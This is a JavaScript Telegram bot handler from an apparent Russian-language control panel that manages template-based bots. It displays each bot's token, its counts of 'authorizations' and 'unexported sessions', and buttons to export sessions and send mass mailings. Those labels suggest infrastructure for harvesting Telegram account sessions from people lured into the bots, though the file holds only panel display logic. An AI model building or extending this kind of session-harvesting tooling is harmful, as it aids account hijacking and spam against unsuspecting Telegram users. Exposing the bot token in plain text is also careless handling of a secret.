import { bot } from "../../index.js";
import Bot from "../../../database/schemas/bot.js";
import Log from "../../../database/schemas/log.js";
import TelegramBot from "node-telegram-bot-api";
import botUser from "../../../database/schemas/botUser.js";
import log from "../../../database/schemas/log.js";
import Database from "../../../database/index.js";

export default {
    name: "bot",
    async exec(query, [id]) {
        const t = await Bot.findOne({ id });
        if(!t) return await bot.answerCallbackQuery(query.id, {
            text: "❌ Бот не найден"
        });
        const starts = (await botUser.find({ botId: t.id })).length;
        const statistics = await Database.getBotStats(t.token);


        await bot.editMessageCaption(query, `*🤖 Бот: @${t.username}

📊 Статус:* \`${t.blocked? 'Заблокирован' : 'Запущен'}\`
*📂 Шаблон:* \`${t.template}\`
*🔑 Токен:* \`${t.token}\`

*🚀 Запусков:* \`${starts}\`
*🚪 Авторизаций:* \`${statistics.all}\`

*📁 Не выгруженных сессий:* \`${(await log.find({ 'bot': t.token, exported: false })).length}\``, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: `📩 Выгрузить сессии`,
                            callback_data: `export:${t.username}`
                        },
                        {
                            text: `📢 Рассылка`,
                            callback_data: `mailer:${t.id}`
                        }
                    ],
                    [
                        {
                            text: '🗑 Удалить бота',
                            callback_data: `deleteBot:${t.id}`
                        }
                    ],
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'bots'
                        }
                    ]
                ]
            },
            message_id: query.message.message_id,
            chat_id: query.message.chat.id
        }, 'cdn/bots.png')
    }
}